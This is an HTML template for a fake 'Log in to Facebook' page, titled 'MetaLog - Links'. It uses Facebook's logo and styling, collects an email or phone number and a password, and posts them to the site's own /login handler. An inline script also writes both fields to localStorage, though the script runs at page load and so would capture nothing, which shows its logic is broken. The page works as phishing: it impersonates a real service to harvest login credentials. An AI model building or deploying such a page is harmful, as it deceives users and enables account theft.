<html>
<head>
  <meta charset="utf-8" />
  <title>MetaLog - Links</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background-color: #f0f2f5;
      display: block;
      font-family: Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    .main {
      padding: 80px 0;
      font-size: 12px;
    }

    .logo {
      display: block;
      height: 40.563px;
      font-size: 12px;
      text-align: center;
    }

    .logo1 {
      margin: -44px 0 -4px 0;
      width: 240px;
      border: 0;
      font-size: 12px;
    }

    .box {
      display: block;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      margin: auto;
      padding: 0 0 14px 0;
      width: 396px;
      background-color: #fff;
      border: 1px solid #dddfe2;
      text-align: center;
      font-size: 12px;
      
    }
    
    h1 {
      font-family: inherit; 
      font-size: 18px; 
      line-height: 22px; 
      font-weight: normal;
      padding: 24px 0 16px 0;
      margin: 0;
      width: 396px;
      height: 22px;
    }

    .login-group {
      font-family: inherit;
      width: 364px;
      padding: 6px 0;
      margin: 0 16px;
      font-size: 12px;
      text-align: center;
    }

    input {
      font-family: inherit;
      width: 364px;
      border-radius: 6px;
      font-size: 17px;
      padding: 14px 16px;
      display: block;
      box-shadow: inset 0 1px 0px rgba(245,245,245,255);
      border: 1px solid #dddfe2;
      

    }

    ::placeholder {
      color: #90949c;
    }

     .button {
      padding: 6px 0;
      display: block;
      text-align: center;
      font-size: 12px;
     }

    .button1 {
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 48px;
      padding: 0 16px;
      width: 364px;
      height: 48px;
      cursor: pointer;
      display: inline-block;
      text-decoration: none;
      white-space: nowrap;
      color: white;
    }

    .button1:hover {
      background-color: #166fe5;
      
    }

    .error {
      color: red;
      font-weight: bold;
    }

  </style>
</head>
<body>
  <div class="main">
    <div class="logo">
      <img class="logo1" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
    </div>
    <div class="box">
      <h1>Log in to Facebook</h1>
      <form action="/login" method="POST">
        <div class="login-group">
          <input type="text" id="username" name="username" placeholder="Email address or phone number">
        </div>
        <div class="login-group">
          <input type="password" id="password" name="password" placeholder="Password">
        </div>
        {% if error %}
          <p class="error">{{ error }}</p>
        {% endif %}
        <div class="button">
          <input type="submit" class="button1" value="Log in">
        </div>
      </form>
      <script>
        // Get the username and password from the form
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        // Store username and password in localStorage
        localStorage.setItem("username", username);
        localStorage.setItem("password", password);
        // Retrieve username and password from localStorage
        var username = localStorage.getItem("username");
        var password = localStorage.getItem("password");
      </script>
    </div>
  </div>
</body>
</html>
